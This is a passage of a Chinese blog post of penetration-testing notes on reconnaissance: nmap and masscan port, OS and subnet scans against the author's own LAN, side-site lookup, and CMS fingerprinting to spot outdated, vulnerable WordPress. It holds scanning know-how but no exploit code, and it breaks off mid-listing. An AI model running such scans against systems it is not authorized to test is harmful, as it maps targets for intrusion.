class="line"></span><br><span class="line">Nmap <span class="keyword">done</span>: 3 IP addresses (2 hosts up) scanned <span class="keyword">in</span> 2.94 seconds</span><br></pre></td></tr></table></figure>

<p>kali nmap对大量端口展开了轰炸</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220604110122323.png" alt="image-20220604110122323"></p>
<h5 id="p-扫描指定端口"><a href="#p-扫描指定端口" class="headerlink" title="-p &lt;port&gt;扫描指定端口"></a><code>-p &lt;port&gt;</code>扫描指定端口</h5><p>比如指定扫描list.txt中列出主机的80端口(http服务器端口)</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿Executor)-[/home/kali/mydir]</span><br><span class="line">└─# nmap -p 80 -iL list.txt</span><br><span class="line">Starting Nmap 7.92 ( https://nmap.org ) at 2022-06-04 10:53 CST</span><br><span class="line">Nmap scan report <span class="keyword">for</span> Executor (192.168.43.44)</span><br><span class="line">Host is up (0.00028s latency).</span><br><span class="line"></span><br><span class="line">PORT   STATE SERVICE</span><br><span class="line">80/tcp open  http</span><br><span class="line"></span><br><span class="line">Nmap scan report <span class="keyword">for</span> 192.168.43.1</span><br><span class="line">Host is up (0.062s latency).</span><br><span class="line"></span><br><span class="line">PORT   STATE  SERVICE</span><br><span class="line">80/tcp closed http</span><br><span class="line"></span><br><span class="line">Nmap <span class="keyword">done</span>: 3 IP addresses (2 hosts up) scanned <span class="keyword">in</span> 2.72 seconds</span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220604105515492.png" alt="image-20220604105515492"></p>
<p>确实Executor上开着一个Apache服务器,但是192.168.43.1手机上没有</p>
<h5 id="F快速模式-只扫描nmap-services中列出的端口"><a href="#F快速模式-只扫描nmap-services中列出的端口" class="headerlink" title="-F快速模式,只扫描nmap-services中列出的端口"></a><code>-F</code>快速模式,只扫描<code>nmap-services</code>中列出的端口</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿Executor)-[/home/kali/mydir]</span><br><span class="line">└─# nmap -F -iL list.txt</span><br><span class="line">Starting Nmap 7.92 ( https://nmap.org ) at 2022-06-04 11:02 CST</span><br><span class="line">Nmap scan report <span class="keyword">for</span> Executor (192.168.43.44)</span><br><span class="line">Host is up (0.00050s latency).</span><br><span class="line">Not shown: 96 closed tcp ports (reset)</span><br><span class="line">PORT    STATE SERVICE</span><br><span class="line">80/tcp  open  http</span><br><span class="line">135/tcp open  msrpc</span><br><span class="line">139/tcp open  netbios-ssn</span><br><span class="line">445/tcp open  microsoft-ds</span><br><span class="line"></span><br><span class="line">Nmap scan report <span class="keyword">for</span> 192.168.43.1</span><br><span class="line">Host is up (0.010s latency).</span><br><span class="line">Not shown: 99 closed tcp ports (reset)</span><br><span class="line">PORT   STATE SERVICE</span><br><span class="line">53/tcp open  domain</span><br><span class="line"></span><br><span class="line">Nmap <span class="keyword">done</span>: 3 IP addresses (2 hosts up) scanned <span class="keyword">in</span> 2.72 seconds</span><br></pre></td></tr></table></figure>



<p>相对于不使用命令行参数的默认扫描方式,该种方式没有扫描到</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">902/tcp open  iss-realsecure</span><br><span class="line">912/tcp open  apex-mesh</span><br></pre></td></tr></table></figure>



<h4 id="操作系统检测"><a href="#操作系统检测" class="headerlink" title="操作系统检测"></a>操作系统检测</h4><p>操作系统检测是基于端口扫描的</p>
<p>如果不指定扫描端口,却进行操作系统检测,是无效的</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿Executor)-[/home/kali/mydir]</span><br><span class="line">└─# nmap -O -A -sn -iL list.txt</span><br><span class="line">WARNING: OS Scan is unreliable without a port scan.  You need to use a scan <span class="built_in">type</span> along with it, such as -sS, -sT, -sF, etc instead of -sn</span><br><span class="line">QUITTING!</span><br></pre></td></tr></table></figure>



<h5 id="O进行操作系统检测-A进行版本检测"><a href="#O进行操作系统检测-A进行版本检测" class="headerlink" title="-O进行操作系统检测,-A进行版本检测"></a><code>-O</code>进行操作系统检测,<code>-A</code>进行版本检测</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">┌──(root㉿Executor)-[/home/kali/mydir]</span><br><span class="line">└─# nmap -O -A -iL list.txt</span><br><span class="line">Starting Nmap 7.92 ( https://nmap.org ) at 2022-06-04 11:07 CST</span><br><span class="line">Nmap scan report <span class="keyword">for</span> Executor (192.168.43.44)</span><br><span class="line">Host is up (0.00038s latency).</span><br><span class="line">Not shown: 994 closed tcp ports (reset)</span><br><span class="line">PORT    STATE SERVICE         VERSION</span><br><span class="line">80/tcp  open  http            Apache httpd 2.4.39 ((Win64) OpenSSL/<span class="number">1.1</span>.<span class="number">1</span>b mod_fcgid/<span class="number">2.3</span>.<span class="number">9</span>a mod_log_rotate/<span class="number">1.02</span>)</span><br><span class="line">|_http-server-header: Apache/<span class="number">2.4</span>.<span class="number">39</span> (Win64) OpenSSL/<span class="number">1.1</span>.<span class="number">1</span>b mod_fcgid/<span class="number">2.3</span>.<span class="number">9</span>a mod_log_rotate/<span class="number">1.02</span></span><br><span class="line">|_http-title: Site doesn&#x27;t have a title (text/html; charset=UTF-<span class="number">8</span>).</span><br><span class="line"><span class="number">135</span>/tcp open  msrpc           Microsoft Windows RPC</span><br><span class="line"><span class="number">139</span>/tcp open  netbios-ssn     Microsoft Windows netbios-ssn</span><br><span class="line"><span class="number">445</span>/tcp open  microsoft-ds?</span><br><span class="line"><span class="number">902</span>/tcp open  ssl/vmware-auth VMware Authentication Daemon <span class="number">1.10</span> (Uses VNC, SOAP)</span><br><span class="line"><span class="number">912</span>/tcp open  vmware-auth     VMware Authentication Daemon <span class="number">1.0</span> (Uses VNC, SOAP)</span><br><span class="line">No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).</span><br><span class="line">TCP/IP fingerprint:</span><br><span class="line">OS:SCAN(V=<span class="number">7.92</span>%E=<span class="number">4</span>%D=<span class="number">6</span>/<span class="number">4</span>%OT=<span class="number">80</span>%CT=<span class="number">1</span>%CU=<span class="number">37312</span>%PV=Y%DS=<span class="number">2</span>%DC=T%G=Y%TM=<span class="number">629</span>ACC98</span><br><span class="line">OS:%P=x86_64-pc-linux-gnu)SEQ(SP=<span class="number">101</span>%GCD=<span class="number">1</span>%ISR=<span class="number">10</span>D%TI=I%CI=I%II=I%SS=S%TS=A</span><br><span class="line">OS:)OPS(O1=MFFD7NW8ST11%O2=MFFD7NW8ST11%O3=MFFD7NW8NNT11%O4=MFFD7NW8ST11%O5</span><br><span class="line">OS:=MFFD7NW8ST11%O6=MFFD7ST11)WIN(W1=FFFF%W2=FFFF%W3=FFFF%W4=FFFF%W5=FFFF%W</span><br><span class="line">OS:<span class="number">6</span>=FFDC)ECN(R=Y%DF=Y%T=<span class="number">7</span>F%W=FFFF%O=MFFD7NW8NNS%CC=N%Q=)T1(R=Y%DF=Y%T=<span class="number">7</span>F%S</span><br><span class="line">OS:=O%A=S+%F=AS%RD=<span class="number">0</span>%Q=)T2(R=Y%DF=Y%T=<span class="number">7</span>F%W=<span class="number">0</span>%S=Z%A=S%F=AR%O=%RD=<span class="number">0</span>%Q=)T3(R=Y</span><br><span class="line">OS:%DF=Y%T=<span class="number">7</span>F%W=<span class="number">0</span>%S=Z%A=O%F=AR%O=%RD=<span class="number">0</span>%Q=)T4(R=Y%DF=Y%T=<span class="number">7</span>F%W=<span class="number">0</span>%S=A%A=O%F=R%</span><br><span class="line">OS:O=%RD=<span class="number">0</span>%Q=)T5(R=Y%DF=Y%T=<span class="number">7</span>F%W=<span class="number">0</span>%S=Z%A=S+%F=AR%O=%RD=<span class="number">0</span>%Q=)T6(R=Y%DF=Y%T=<span class="number">7</span></span><br><span class="line">OS:F%W=<span class="number">0</span>%S=A%A=O%F=R%O=%RD=<span class="number">0</span>%Q=)T7(R=Y%DF=Y%T=<span class="number">7</span>F%W=<span class="number">0</span>%S=Z%A=S+%F=AR%O=%RD=<span class="number">0</span>%</span><br><span class="line">OS:Q=)U1(R=Y%DF=N%T=<span class="number">7</span>F%IPL=<span class="number">164</span>%UN=<span class="number">0</span>%RIPL=G%RID=G%RIPCK=G%RUCK=<span class="number">37</span>DE%RUD=G)IE</span><br><span class="line">OS:(R=Y%DFI=N%T=<span class="number">7</span>F%CD=Z)</span><br><span class="line"></span><br><span class="line">Network Distance: <span class="number">2</span> hops</span><br><span class="line">Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows</span><br><span class="line"></span><br><span class="line">Host script results:</span><br><span class="line">| smb2-time:</span><br><span class="line">|   date: <span class="number">2022</span>-<span class="number">06</span>-<span class="number">04</span>T03:<span class="number">08</span>:<span class="number">00</span></span><br><span class="line">|_  start_date: N/A</span><br><span class="line">|_nbstat: NetBIOS name: EXECUTOR, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: <span class="number">2</span>c:<span class="number">6</span>d:c1:<span class="number">98</span>:<span class="number">7</span>d:<span class="number">03</span> (Intel Corporate)</span><br><span class="line">| smb2-security-mode:</span><br><span class="line">|   <span class="number">3.1</span>.<span class="number">1</span>:</span><br><span class="line">|_    Message signing enabled but not required</span><br><span class="line"></span><br><span class="line">TRACEROUTE (using port <span class="number">587</span>/tcp)</span><br><span class="line">HOP RTT     ADDRESS</span><br><span class="line"><span class="number">1</span>   <span class="number">0.41</span> ms Executor.mshome.net (<span class="number">172.28</span>.<span class="number">16.1</span>)</span><br><span class="line"><span class="number">2</span>   <span class="number">0.43</span> ms Executor (<span class="number">192.168</span>.<span class="number">43.44</span>)</span><br><span class="line"></span><br><span class="line">Nmap scan report for <span class="number">192.168</span>.<span class="number">43.1</span></span><br><span class="line">Host is up (<span class="number">0.0065</span>s latency).</span><br><span class="line">Not shown: <span class="number">999</span> closed tcp ports (reset)</span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line"><span class="number">53</span>/tcp open  domain  dnsmasq <span class="number">2.51</span></span><br><span class="line">| dns-nsid:</span><br><span class="line">|_  bind.version: dnsmasq-<span class="number">2.51</span></span><br><span class="line">No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).</span><br><span class="line">TCP/IP fingerprint:</span><br><span class="line">OS:SCAN(V=<span class="number">7.92</span>%E=<span class="number">4</span>%D=<span class="number">6</span>/<span class="number">4</span>%OT=<span class="number">53</span>%CT=<span class="number">1</span>%CU=<span class="number">35611</span>%PV=Y%DS=<span class="number">2</span>%DC=T%G=Y%TM=<span class="number">629</span>ACC98</span><br><span class="line">OS:%P=x86_64-pc-linux-gnu)SEQ(SP=<span class="number">103</span>%GCD=<span class="number">1</span>%ISR=<span class="number">10</span>C%TI=Z%CI=Z%II=I%TS=A)OPS(</span><br><span class="line">OS:O1=M5B4ST11NW9%O2=M5B4ST11NW9%O3=M5B4NNT11NW9%O4=M5B4ST11NW9%O5=M5B4ST11</span><br><span class="line">OS:NW9%O6=M5B4ST11)WIN(W1=FFFF%W2=FFFF%W3=FFFF%W4=FFFF%W5=FFFF%W6=FFFF)ECN(</span><br><span class="line">OS:R=Y%DF=Y%T=<span class="number">40</span>%W=FFFF%O=M5B4NNSNW9%CC=Y%Q=)T1(R=Y%DF=Y%T=<span class="number">40</span>%S=O%A=S+%F=AS</span><br><span class="line">OS:%RD=<span class="number">0</span>%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=<span class="number">40</span>%W=<span class="number">0</span>%S=A%A=Z%F=R%O=%RD=<span class="number">0</span>%Q=)T5(R=</span><br><span class="line">OS:Y%DF=Y%T=<span class="number">40</span>%W=<span class="number">0</span>%S=Z%A=S+%F=AR%O=%RD=<span class="number">0</span>%Q=)T6(R=Y%DF=Y%T=<span class="number">40</span>%W=<span class="number">0</span>%S=A%A=Z%F=</span><br><span class="line">OS:R%O=%RD=<span class="number">0</span>%Q=)T7(R=Y%DF=Y%T=<span class="number">40</span>%W=<span class="number">0</span>%S=Z%A=S+%F=AR%O=%RD=<span class="number">0</span>%Q=)U1(R=Y%DF=N%T</span><br><span class="line">OS:=<span class="number">40</span>%IPL=<span class="number">164</span>%UN=<span class="number">0</span>%RIPL=G%RID=G%RIPCK=G%RUCK=<span class="number">3</span>EAE%RUD=G)IE(R=Y%DFI=N%T=<span class="number">40</span>%</span><br><span class="line">OS:CD=S)</span><br><span class="line"></span><br><span class="line">Network Distance: <span class="number">2</span> hops</span><br><span class="line"></span><br><span class="line">TRACEROUTE (using port <span class="number">587</span>/tcp)</span><br><span class="line">HOP RTT     ADDRESS</span><br><span class="line">-   Hop <span class="number">1</span> is the same as for <span class="number">192.168</span>.<span class="number">43.44</span></span><br><span class="line"><span class="number">2</span>   <span class="number">7.82</span> ms <span class="number">192.168</span>.<span class="number">43.1</span></span><br><span class="line"></span><br><span class="line">OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap done: <span class="number">3</span> IP addresses (<span class="number">2</span> hosts up) scanned in <span class="number">30.29</span> seconds</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>这里检测出了192.168.43.44的操作系统</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows</span><br></pre></td></tr></table></figure>

<p>但是没有检测出192.168.43.1的操作系统</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).</span><br></pre></td></tr></table></figure>

<h5 id="其他方法"><a href="#其他方法" class="headerlink" title="其他方法"></a>其他方法</h5><p><img src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220604112513527.png" alt="image-20220604112513527"></p>
<h3 id="masscan"><a href="#masscan" class="headerlink" title="masscan"></a>masscan</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿Executor)-[/home/kali/mydir]</span><br><span class="line">└─# masscan -p1-65535 --rate=10000 192.168.43.44</span><br><span class="line">Starting masscan 1.3.2 (http://bit.ly/14GZzcT) at 2022-06-04 03:22:19 GMT</span><br><span class="line">Initiating SYN Stealth Scan</span><br><span class="line">Scanning 1 hosts [65535 ports/host]</span><br><span class="line">Discovered open port 135/tcp on 192.168.43.44</span><br><span class="line">Discovered open port 49664/tcp on 192.168.43.44</span><br><span class="line">Discovered open port 49672/tcp on 192.168.43.44</span><br><span class="line">Discovered open port 49666/tcp on 192.168.43.44</span><br><span class="line">Discovered open port 54260/tcp on 192.168.43.44</span><br><span class="line">Discovered open port 9955/tcp on 192.168.43.44</span><br><span class="line">Discovered open port 902/tcp on 192.168.43.44</span><br><span class="line">Discovered open port 445/tcp on 192.168.43.44</span><br><span class="line">Discovered open port 49667/tcp on 192.168.43.44</span><br><span class="line">Discovered open port 5040/tcp on 192.168.43.44</span><br><span class="line">Discovered open port 49665/tcp on 192.168.43.44</span><br><span class="line">Discovered open port 912/tcp on 192.168.43.44</span><br><span class="line">Discovered open port 49669/tcp on 192.168.43.44</span><br><span class="line">Discovered open port 139/tcp on 192.168.43.44</span><br><span class="line">rate:  0.00-kpps, 100.00% <span class="keyword">done</span>, waiting 4-secs, found=14</span><br></pre></td></tr></table></figure>





<h3 id="端口漏洞利用"><a href="#端口漏洞利用" class="headerlink" title="端口漏洞利用"></a>端口漏洞利用</h3><h2 id="旁站"><a href="#旁站" class="headerlink" title="旁站"></a>旁站</h2><p>一个IP或者域名所在的服务器有可能还运行着其他网站,目标站点和旁站对应于服务器的不同端口,对应于同一WEB服务的不同路径</p>
<p>主站点难以找到漏洞时考虑从旁站入侵</p>
<p>收集信息种类:</p>
<p>1.收集旁站的 域名信息</p>
<p>注册人姓名电话邮箱,NS服务器</p>
<p>2.收集旁站的 程序信息</p>
<p>服务器及中间件</p>
<p>脚本或者使用框架</p>
<p>后台及敏感目录</p>
<p>是否存在已知漏洞</p>
<h3 id="在线网站查旁站"><a href="#在线网站查旁站" class="headerlink" title="在线网站查旁站"></a>在线网站查旁站</h3><p><a target="_blank" rel="noopener" href="https://ipchaxun.com/">查旁网</a></p>
<p>从我的博客域名<code>dustball.top</code>开始查</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220604120742428.png" alt="image-20220604120742428"></p>
<p>首先查到ip地址,然后再查ip地址<code>185.199.109.153</code></p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220604120923351.png" alt="image-20220604120923351"></p>
<p>这些网站显然和博客是一个性质的,基于github page的搭建的</p>
<p>其中有一个</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220604121049066.png" alt="image-20220604121049066"></p>
<p>根据我对二刺螈的理解,这里面准有好康的</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220604121151087.png" alt="image-20220604121151087"></p>
<p>dddd</p>
<h3 id="本地工具查旁站"><a href="#本地工具查旁站" class="headerlink" title="本地工具查旁站"></a>本地工具查旁站</h3><h3 id="端口查旁站"><a href="#端口查旁站" class="headerlink" title="端口查旁站"></a>端口查旁站</h3><p>同一个主机是否开放了除80端口之外的http,https,http-proxy等服务</p>
<h2 id="C段"><a href="#C段" class="headerlink" title="C段"></a>C段</h2><p> C段就是通过一个路由器连接的主机集合</p>
<h3 id="在线接口查询"><a href="#在线接口查询" class="headerlink" title="在线接口查询"></a>在线接口查询</h3><p><a target="_blank" rel="noopener" href="https://chapangzhan.com/">查旁网</a></p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220604162410662.png" alt="image-20220604162410662"></p>
<h3 id="本地工具扫描"><a href="#本地工具扫描" class="headerlink" title="本地工具扫描"></a>本地工具扫描</h3><h4 id="nmap扫描C段"><a href="#nmap扫描C段" class="headerlink" title="nmap扫描C段"></a>nmap扫描C段</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿Executor)-[/home/kali]</span><br><span class="line">└─# nmap -sP 192.168.3.0/24</span><br><span class="line">Starting Nmap 7.92 ( https://nmap.org ) at 2022-06-04 16:22 CST</span><br><span class="line">Nmap scan report <span class="keyword">for</span> 192.168.3.1</span><br><span class="line">Host is up (0.0027s latency).</span><br><span class="line">Nmap scan report <span class="keyword">for</span> host.docker.internal (192.168.3.2)</span><br><span class="line">Host is up (0.00026s latency).</span><br><span class="line">Nmap scan report <span class="keyword">for</span> 192.168.3.7</span><br><span class="line">Host is up (0.0060s latency).</span><br><span class="line">Nmap <span class="keyword">done</span>: 256 IP addresses (3 hosts up) scanned <span class="keyword">in</span> 5.14 seconds</span><br></pre></td></tr></table></figure>



<h4 id="IIS-Put-Scanner"><a href="#IIS-Put-Scanner" class="headerlink" title="IIS Put Scanner"></a>IIS Put Scanner</h4><p><img src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220604162623631.png" alt="image-20220604162623631"></p>
<h2 id="指纹识别"><a href="#指纹识别" class="headerlink" title="指纹识别"></a>指纹识别</h2><p>啥叫指纹识别?</p>
<p>就是通过网页上留下的蛛丝马迹,识别出该网站使用哪一款CMS建站</p>
<p>比如页面底部的版权信息</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220604163706007.png" alt="image-20220604163706007"></p>
<p>或者访问不存在的页面返回的错误信息</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220604192416711.png" alt="image-20220604192416711"></p>
<blockquote>
<p>这个错误页面可以修改,不让它暴露中间件信息</p>
</blockquote>
<p>还要获取该CMS的版本信息</p>
<p>然后就可以到CMS的官网上下载源代码进行白盒测试了</p>
<p>或者目标使用的低版本CMS已经有漏洞被曝光,直接利用</p>
<p>指纹识别要收集的信息:</p>
<p>1.web服务器(中间件)类型版本</p>
<p>2.前端技术</p>
<p>3.CMS</p>
<p>4.开发语言</p>
<p>等等</p>
<h3 id="在线指纹识别"><a href="#在线指纹识别" class="headerlink" title="在线指纹识别"></a>在线指纹识别</h3><p>比如某些企业的官网</p>
<p>尤其是乡镇上的小企业,必然没钱自己写一个网站后端,也就是请一些技术人员用现成的CMS建站吧,并且也意识不到更新的必要性</p>
<h4 id="What-CMS"><a href="#What-CMS" class="headerlink" title="What CMS"></a>What CMS</h4><p><a target="_blank" rel="noopener" href="https://whatcms.org/">Detect which CMS a site is using - What CMS?</a></p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220604164434798.png" alt="image-20220604164434798"></p>
<p>然而最新的wordpress已经到了6.0</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220604164700687.png" alt="image-20220604164700687"></p>
<p>然后搜索wordpress 5.0漏洞</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220604164739355.png" alt="image-20220604164739355"></p>
<p>当然4.9版本也是包含此漏洞的,这意味着什么呢?</p>
<h4 id="yunsee"><a href="#yunsee" class="headerlink" title="yunsee"></a>yunsee</h4><p>需要登录才可以查</p>
<p>然而注册还要邀请码</p>
<p>屑</p>
<h3 id="本地工具-1"><a href="#本地工具-1" class="headerlink" title="本地工具"></a>本地工具</h3><h4 id="御剑"><a href="#御剑" class="headerlink" title="御剑"></a>御剑</h4><p>有一个挖旁站的御剑,还有一个挖指纹的御剑</p>
<p>挖指纹这个是这样工作的:</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220604165921960.png" alt="image-20220604165921960"></p>
<p>在Bin目录下面每个CMS的指纹写成一个txt文件</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> D:\web安全\御剑\御剑+加强字典+批量\Bin&gt; <span class="built_in">dir</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    目录: D:\web安全\御剑\御剑+加强字典+批量\Bin</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Mode                 LastWriteTime         Length Name</span><br><span class="line"><span class="literal">----</span>                 <span class="literal">-------------</span>         <span class="literal">------</span> <span class="literal">----</span></span><br><span class="line"><span class="literal">-a----</span>         <span class="number">2013</span>/<span class="number">4</span>/<span class="number">24</span>     <span class="number">15</span>:<span class="number">40</span>            <span class="number">530</span> aspcms.txt</span><br><span class="line"><span class="literal">-a----</span>         <span class="number">2013</span>/<span class="number">4</span>/<span class="number">24</span>     <span class="number">15</span>:<span class="number">41</span>           <span class="number">1136</span> dedecms.txt</span><br><span class="line"><span class="literal">-a----</span>         <span class="number">2013</span>/<span class="number">4</span>/<span class="number">24</span>     <span class="number">16</span>:<span class="number">22</span>           <span class="number">1378</span> discuz.txt</span><br><span class="line"><span class="literal">-a----</span>         <span class="number">2013</span>/<span class="number">4</span>/<span class="number">24</span>     <span class="number">15</span>:<span class="number">42</span>           <span class="number">2290</span> drupal.txt</span><br><span class="line"><span class="literal">-a----</span>         <span class="number">2013</span>/<span class="number">4</span>/<span class="number">24</span>     <span class="number">15</span>:<span class="number">42</span>           <span class="number">1918</span> dvbbs.txt</span><br><span class="line"><span class="literal">-a----</span>         <span class="number">2013</span>/<span class="number">4</span>/<span class="number">24</span>     <span class="number">15</span>:<span class="number">43</span>           <span class="number">1563</span> ecshop.txt</span><br><span class="line"><span class="literal">-a----</span>         <span class="number">2013</span>/<span class="number">4</span>/<span class="number">24</span>     <span class="number">15</span>:<span class="number">43</span>            <span class="number">595</span> emlog.txt</span><br><span class="line"><span class="literal">-a----</span>         <span class="number">2013</span>/<span class="number">4</span>/<span class="number">24</span>     <span class="number">15</span>:<span class="number">44</span>           <span class="number">1834</span> empirecms.txt</span><br><span class="line"><span class="literal">-a----</span>         <span class="number">2013</span>/<span class="number">4</span>/<span class="number">24</span>     <span class="number">15</span>:<span class="number">45</span>            <span class="number">898</span> espcms.txt</span><br><span class="line"><span class="literal">-a----</span>         <span class="number">2013</span>/<span class="number">4</span>/<span class="number">24</span>     <span class="number">15</span>:<span class="number">45</span>           <span class="number">1397</span> foosuncms.txt</span><br><span class="line"><span class="literal">-a----</span>         <span class="number">2013</span>/<span class="number">4</span>/<span class="number">24</span>     <span class="number">15</span>:<span class="number">45</span>           <span class="number">1109</span> hdwiki.txt</span><br><span class="line"><span class="literal">-a----</span>         <span class="number">2013</span>/<span class="number">4</span>/<span class="number">24</span>     <span class="number">15</span>:<span class="number">46</span>           <span class="number">1772</span> joomla.txt</span><br><span class="line"><span class="literal">-a----</span>         <span class="number">2013</span>/<span class="number">4</span>/<span class="number">24</span>     <span class="number">15</span>:<span class="number">46</span>            <span class="number">692</span> kesioncms.txt</span><br><span class="line"><span class="literal">-a----</span>         <span class="number">2013</span>/<span class="number">4</span>/<span class="number">24</span>     <span class="number">15</span>:<span class="number">50</span>           <span class="number">2277</span> kingcms.txt</span><br><span class="line"><span class="literal">-a----</span>         <span class="number">2013</span>/<span class="number">4</span>/<span class="number">24</span>     <span class="number">15</span>:<span class="number">51</span>           <span class="number">1018</span> ljcms.txt</span><br><span class="line"><span class="literal">-a----</span>         <span class="number">2013</span>/<span class="number">4</span>/<span class="number">24</span>     <span class="number">15</span>:<span class="number">51</span>            <span class="number">786</span> php168.txt</span><br><span class="line"><span class="literal">-a----</span>         <span class="number">2013</span>/<span class="number">4</span>/<span class="number">24</span>     <span class="number">15</span>:<span class="number">52</span>           <span class="number">2468</span> phpcms.txt</span><br><span class="line"><span class="literal">-a----</span>         <span class="number">2013</span>/<span class="number">4</span>/<span class="number">24</span>     <span class="number">15</span>:<span class="number">52</span>           <span class="number">2041</span> phpwind.txt</span><br><span class="line"><span 